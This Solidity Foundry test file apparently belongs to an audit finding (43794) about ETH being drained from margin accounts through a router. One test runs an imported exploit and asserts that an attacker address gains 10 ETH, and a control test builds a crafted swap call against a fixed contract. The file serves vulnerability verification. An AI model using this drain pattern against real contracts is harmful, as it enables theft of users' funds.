// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Router, MarginAccountFixed, Command} from
    "./43794-native-tokens-may-be-drained-from-margin-accounts-via-lack-o.sol";

contract Finding43794Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_margin_eth_is_swept_from_the_router() public {
        Exploit e = new Exploit();
        vm.deal(address(e.margin()), 10 ether);
        uint256 beforeBal = ATTACKER.balance;

        e.run();

        assertEq(ATTACKER.balance - beforeBal, 10 ether, "attacker gained 10 ETH");
        assertEq(address(e.margin()).balance, 0, "margin empty");
        assertEq(address(e.router()).balance, 0, "router empty");
    }

    function test_control_zero_value_leaves_the_eth() public {
        Router router = new Router();
        MarginAccountFixed margin = new MarginAccountFixed();
        vm.deal(address(margin), 10 ether);

        bytes memory payload = abi.encodeWithSelector(
            Router.swapExactTokensForTokens.selector,
            uint256(1),
            uint256(0),
            new address[](0),
            address(margin),
            block.timestamp
        );
        Command memory cmd = Command({target: address(router), value: 10 ether, data: payload});
        Command[] memory cmds = new Command[](1);
        cmds[0] = cmd;
        margin.execute(cmd, abi.encode(cmds));

        assertEq(address(margin).balance, 10 ether, "margin kept 10 ETH");
        assertEq(address(router).balance, 0, "router received none");
    }
}
